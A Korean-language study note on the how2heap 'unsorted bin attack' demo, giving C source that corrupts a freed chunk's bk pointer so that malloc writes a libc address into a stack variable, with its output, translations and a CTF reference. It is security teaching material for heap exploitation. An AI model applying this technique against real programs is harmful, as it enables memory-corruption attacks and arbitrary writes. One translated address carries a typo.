# How2Heap Study 11 Unsorted Bin Attack

## Tech Overview

Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address

## Source

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, target should has already been "
		   "rewrite:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

## Output

```
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7fffca6a0198: 0

Now, we allocate first normal chunk on the heap at: 0xb1d010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7fa3f8ff4b78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fffca6a0188

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7fffca6a0198: 0x7fa3f8ff4b78
```

## 개요 번역

Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address
임의의 주소에 큰 값을 넣기 위하여 unsorted bin 해제 목록 안에 있는 해제된 청크를 덮어쓰는 공격을 합니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
이 파일은 stack 에 unsorted bin 공격을 통해 큰 unsigned long 값을 쓰는 공격을 시연합니다.

In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
사실은, unsorted bin 공격은 일반적으로 더 나중에 사용할 공격의 준비단계입니다. 예를 들어 더 나중의 fastbin 공격을 위해 libc 안의 global_max_fast 전역 변수를 덮어쓰는 공격입니다.

Let's first look at the target we want to rewrite on stack:
처음으로 값을 덮어쓸 공격 대상 스택은 다음과 같습니다.

0x7fffca6a0198: 0

Now, we allocate first normal chunk on the heap at: 0xb1d010
이제, 평범한 첫 번째 청크를 힙에 할당합니다. : 0xb1d010

And allocate another normal chunk in order to avoid consolidating the top chunk with the first one during the free()
그리고 free 를 할 때 첫 번째 청크와 top 청크가 합쳐지지 않도록 또 다른 평범한 청크를 할당합니다.

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7fa3f8ff4b78
이제 첫 번째 청크를 해제하고, 이 것은 unsorted bin 안에 들어가게 될 것이며, 이것의 bk 포인터는 0x7fa3f8ff4b78 를 가리킬 것입니다.

Now emulating a vulnerability that can overwrite the victim->bk pointer
이제 취약점을 시연하여 공격대상의 bk 포인터를 덮어쓰겠습니다.

And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fffca6a01880
그리고 대상 주소 -16 을 씁니다. (32비트 시스템에서는, 이 것은 대상 주소 - 8 입니다.): 0x7fffca6a01880

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
malloc 를 한 번 더 호출하여 해제했던 청크를 얻습니다. 이 시간동안, 공격 대상은 이미 값이 덮어써져 있습니다.

0x7fffca6a0198: 0x7fa3f8ff4b78
```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* 0ctf 2016-zerostorage - [블로그]() / [바이너리]((https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6)
